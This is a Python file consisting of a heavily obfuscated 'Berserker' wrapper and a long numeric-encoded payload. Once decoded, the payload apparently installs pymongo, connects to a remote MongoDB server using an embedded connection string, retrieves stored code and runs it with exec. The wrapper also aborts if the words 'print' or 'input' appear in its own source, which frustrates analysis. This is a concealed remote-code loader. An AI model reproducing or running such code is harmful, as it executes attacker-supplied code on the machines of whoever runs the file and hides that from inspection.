class Berserker():
 def __init__(self:object,_exec:str=False,_rasputin:int=0,*_bytes:str,**_delete:bool)->exec:
  _delete[_rasputin],self._encode,self._bits,self._bit,_exec,self._boom=eval,exit()if _exec else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _exit:_exec(_exit),lambda _decode:"".join(chr(int(_byte)-len(_decode.split('~')))if _byte!='¨'else'ζ'for _byte in str(_decode).split('~')),lambda _exec:exit()if self._encode[15]+self._encode[17]+self._encode[8]+self._encode[13]+self._encode[19] in open(__file__, errors=self._encode[8]+self._encode[6]+self._encode[13]+self._encode[14]+self._encode[17]+self._encode[4]).read() or self._encode[8]+self._encode[13]+self._encode[15]+self._encode[20]+self._encode[19] in open(__file__, errors=self._encode[8]+self._encode[6]+self._encode[13]+self._encode[14]+self._encode[17]+self._encode[4]).read()else"".join(_exec if _exec not in self._encode else self._encode[self._encode.index(_exec)+1 if self._encode.index(_exec)+1<len(self._encode)else 0]for _exec in "".join(chr(ord(t)-84848)if t!="ζ"else"\n"for t in self._bit(_exec))),lambda _exec:str(_delete[_rasputin](f"{self._encode[4]+self._encode[-13]+self._encode[4]+self._encode[2]}(''.join(%s),{self._encode[6]+self._encode[11]+self._encode[14]+self._encode[1]+self._encode[0]+self._encode[11]+self._encode[18]}())"%list(_exec))).encode(self._encode[20]+self._encode[19]+self._encode[5]+self._encode[34])if _delete[_rasputin]==eval else exit()
  return self.__decode__(_delete[(self._encode[-1]+'_')[-1]+self._encode[18]+self._encode[15]+self._encode[0]+self._encode[17]+self._encode[10]+self._encode[11]+self._encode[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._boom(self._bits(_execute)))[0]
Berserker(_exec=False,_sparkle='''85631~85629~85636~85574~¨~85548~85548~85548~85548~85620~85624~85627~85626~85629~85631~85548~85627~85636~85624~85626~85625~85618~85626~85560~85548~85630~85636~85630~¨~85616~85635~85614~85616~85627~85631~85574~¨~85548~85548~85548~85548~85620~85624~85627~85626~85629~85631~85548~85626~85630~85560~85548~85630~85636~85630~¨~85548~85548~85548~85548~85626~85630~85562~85630~85636~85630~85631~85616~85624~85556~85555~85627~85620~85627~85548~85620~85625~85630~85631~85573~85623~85623~85548~85627~85636~85624~85626~85625~85618~85626~85555~85557~¨~85548~85548~85548~85548~85620~85624~85627~85626~85629~85631~85548~85627~85636~85624~85626~85625~85618~85626~¨~¨~85620~85617~85548~85623~85616~85625~85556~85630~85636~85630~85562~85573~85629~85618~85633~85557~85548~85578~85548~85564~85574~¨~85548~85548~85548~85548~85615~85613~85594~85573~85624~85616~85548~85577~85548~85630~85631~85629~85556~85630~85636~85630~85562~85573~85629~85618~85633~85607~85564~85609~85557~¨~85616~85623~85630~85616~85574~¨~85548~85548~85548~85548~85615~85613~85594~85573~85624~85616~85548~85577~85548~85550~85550~¨~85548~85548~85548~85548~¨~85620~85624~85627~85626~85629~85631~85548~85615~85625~85630~85562~85629~85616~85630~85626~85623~85633~85616~85629~¨~85615~85625~85630~85562~85629~85616~85630~85626~85623~85633~85616~85629~85562~85615~85616~85617~85573~85632~85623~85631~85611~85629~85616~85630~85626~85623~85633~85616~85629~85577~85615~85625~85630~85562~85629~85616~85630~85626~85623~85633~85616~85629~85562~85598~85616~85630~85626~85623~85633~85616~85629~85556~85614~85626~85625~85617~85620~85618~85632~85629~85616~85577~85586~85573~85623~85630~85616~85557~¨~85615~85625~85630~85562~85629~85616~85630~85626~85623~85633~85616~85629~85562~85615~85616~85617~85573~85632~85623~85631~85611~85629~85616~85630~85626~85623~85633~85616~85629~85562~85625~85573~85624~85616~85630~85616~85629~85633~85616~85629~85630~85577~85607~85555~85571~85562~85571~85562~85571~85562~85571~85555~85609~¨~¨~85634~85619~85620~85623~85616~85548~85600~85629~85632~85616~85574~¨~85548~85548~85548~85548~85631~85629~85636~85574~¨~85548~85548~85548~85548~85548~85548~85548~85548~85624~85636~85614~85623~85620~85616~85625~85631~85548~85577~85548~85627~85636~85624~85626~85625~85618~85626~85562~85593~85626~85625~85618~85626~85583~85623~85620~85616~85625~85631~85556~85550~85624~85626~85625~85618~85626~85615~85613~85559~85630~85629~85633~85574~85563~85563~85601~85583~85593~85573~85625~85573~85618~85616~85574~85597~85587~85635~85604~85620~85623~85631~85631~85589~85617~85636~85615~85594~85602~85617~85619~85580~85632~85614~85624~85573~85625~85573~85618~85616~85629~85562~85630~85573~85567~85570~85623~85566~85616~85562~85624~85626~85625~85618~85626~85615~85613~85562~85625~85616~85631~85563~85579~85629~85616~85631~85629~85636~85603~85629~85620~85631~85616~85630~85577~85631~85629~85632~85616~85554~85634~85577~85624~85573~85621~85626~85629~85620~85631~85636~85550~85557~¨~85548~85548~85548~85548~85548~85548~85548~85548~85614~85626~85615~85616~85584~85582~85548~85577~85548~85624~85636~85614~85623~85620~85616~85625~85631~85607~85555~85599~85626~85632~85629~85614~85616~85583~85626~85615~85616~85555~85609~85562~85601~85630~85616~85629~85583~85626~85615~85616~¨~85548~85548~85548~85548~85548~85548~85548~85548~85614~85626~85615~85616~85548~85577~85548~85614~85626~85615~85616~85584~85582~85562~85617~85620~85625~85615~85556~85639~85641~85557~85607~85638~85609~85607~85550~85618~85620~85631~85619~85632~85613~85583~85626~85615~85616~85550~85609~¨~85548~85548~85548~85548~85548~85548~85548~85548~85616~85633~85573~85623~85556~85555~85616~85635~85616~85614~85556~85614~85626~85615~85616~85557~85555~85557~¨~85548~85548~85548~85548~85616~85635~85614~85616~85627~85631~85548~85585~85635~85614~85616~85627~85631~85620~85626~85625~85548~85573~85630~85548~85616~85635~85574~¨~85548~85548~85548~85548~85548~85548~85548~85548~85627~85629~85620~85625~85631~85556~85616~85635~85557~¨''')
